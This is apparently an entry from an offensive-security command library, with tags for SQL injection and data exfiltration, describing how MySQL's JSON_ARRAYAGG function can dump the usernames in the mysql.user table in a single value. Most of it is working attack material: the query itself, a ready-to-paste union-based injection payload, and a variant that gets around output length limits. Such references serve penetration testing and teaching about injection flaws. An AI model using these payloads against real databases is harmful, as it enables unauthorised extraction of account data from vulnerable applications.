---
id: ef197464-1d45-40e1-9c0c-c6a7c0fb3931
name: mysql-json-arrayagg-dump
type: command
executor: sql
data: SELECT json_arrayagg(user) FROM mysql.user
output: null
created_at: '2023-04-06T03:56:34.912781+00:00'
updated_at: '2023-04-10T20:22:50.539408+00:00'
platforms:
  - Linux
  - Web
tags:
  - sql-injection
  - data-exfiltration
verified: true
validated: true
---

# mysql-json-arrayagg-dump

## Command

```sql
SELECT json_arrayagg(user) FROM mysql.user;
```

## Description

This SQL command uses the JSON_ARRAYAGG function to aggregate column values into a JSON array, enabling compact data dumps in SQL injection attacks. It targets the mysql.user table to extract usernames; adapt the column and table for other data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| json_arrayagg(column) | Aggregates values from the specified column into a JSON array. | Yes |
| FROM table | Specifies the target table to query. | Yes |

## Examples

### Basic Usage

```sql
SELECT json_arrayagg(name) FROM users;
```

### Injected Usage (Union-Based)

For a single-column vulnerable query:

```sql
' UNION SELECT json_arrayagg(user) FROM mysql.user -- -
```

### Limited Output

To avoid length issues:

```sql
SELECT json_arrayagg(SUBSTRING(user,1,50)) FROM mysql.user;
```

## Expected Output

A JSON array such as ["root", "mysql.sys", "admin"], returned as a single value in the query result.

## Related

- [[procedures/Exploit-MySQL-SQL-Injection-Using-Aggregation-Functions]]
